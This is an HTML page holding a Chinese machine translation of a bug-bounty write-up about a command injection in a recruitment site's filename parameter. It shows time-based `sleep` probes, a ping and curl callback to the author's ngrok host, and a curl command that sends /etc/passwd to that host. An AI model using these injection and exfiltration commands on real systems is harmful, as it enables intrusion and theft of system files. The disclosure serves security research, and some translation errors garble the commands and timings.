<html>
<head>
<title>Command Injection PoC</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">命令注入概念验证</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/command-injection-poc-72cc3743f10d?source=collection_archive---------0-----------------------#2018-01-15">https://infosecwriteups.com/command-injection-poc-72cc3743f10d?source=collection_archive---------0-----------------------#2018-01-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="453c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以早在2017年12月，我在一个招聘网站上发现了一个命令注入漏洞。这是简单的概念证明。易受攻击的参数是<strong class="jp ir">文件名</strong>。</p><p id="bf31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我用这个命令<strong class="jp ir"> `sleep 5` </strong>进行了测试，响应延迟了5-6秒(6.113毫秒)。见右下角的延迟。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/64469ea025fce50051c40cd37de04839.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V3xkslFjz2XoK5V1qDUmLw.png"/></div></div></figure><p id="397c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我再次用<strong class="jp ir">`睡眠10` </strong>检查，只是为了确认一下，看看有什么不同。响应再次延迟10-11秒(11.137毫秒)。见右下角的延迟。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/6bf12eaddbbbc44660244f417eeab459.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VyOzBhXobUDs7TitXDR0Aw.png"/></div></div></figure><p id="330d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试使用<strong class="jp ir"> `ping -c 5 &lt;我的服务器IP地址&gt;`</strong>ping我的服务器，并在我的服务器上运行<strong class="jp ir"> tcpdump -i &lt;接口&gt; -n icmp </strong>来查看传入的icmp数据包。ping命令意味着向我的服务器IP地址发送5次ICMP数据包。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/c8aab9dcfc06ba2c5f6ce62e703d7618.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*sPFz0tYKEdtbcGerWFl32g.png"/></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/ca5b598bf0e2fd1f98c8f7fa824b0679.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y2kCPDpoUyuBEU5QSt3O3w.png"/></div></div></figure><p id="6a8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">抱歉编辑，但你可以看到我有5次传入ICMP数据包。我的服务器IP地址是5.000.000.105，传入的ICMP数据包来自000.000.39.169。现在我知道filename参数容易受到命令注入的攻击。</p><p id="01b4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在用ngrok做另一个测试。所以我跑<strong class="jp ir">。/ngrok http 80 </strong>在我的本地主机上，我对易受攻击的参数执行这个<strong class="jp ir">` curl blablabla . ngrok . io `</strong>。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/2d5cc803134a9035a7e510d41824bde6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*Z6W4aluJqanwHfW59iCfZw.png"/></div></figure><p id="d3ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在看看ngrok web界面上的响应(http://127.0.0.1:4040)。我收到来自IP地址000.000.39.169的传入请求。上面ICMP请求中的相同IP地址。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kz"><img src="../Images/e174dddded00d690ca01d5a8a8d6931c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*ChXRkiXPK74yynwh6CPFkA.png"/></div></figure><p id="40e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我可以读取易受攻击的服务器上的文件，并使用以下命令将其发送到我的ngrok地址<strong class="jp ir">` curl-F SHL = @/etc/passwd blablabla . ngrok . io `</strong>。该命令意味着使用包含/etc/passwd的shl参数向blablabla.ngrok.io发送POST请求。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/5e05ece2b15a3e2ef7d0366b82b418b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1364/format:webp/1*RetCHhSriePnRrDYWTrBDg.png"/></div></figure><p id="bff5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果是易受攻击的服务器将他们的/etc/passwd发送到我的ngrok地址。同样来自IP地址000.000.39.169。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi la"><img src="../Images/da1bc295d80d96979a7e3ff47647b017.png" data-original-src="https://miro.medium.com/v2/resize:fit:1184/format:webp/1*vs9tnRAIzlrdBuEF78rJaA.png"/></div></figure><p id="6920" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">就是这样！黑客快乐！:)</p></div></div>    
</body>
</html>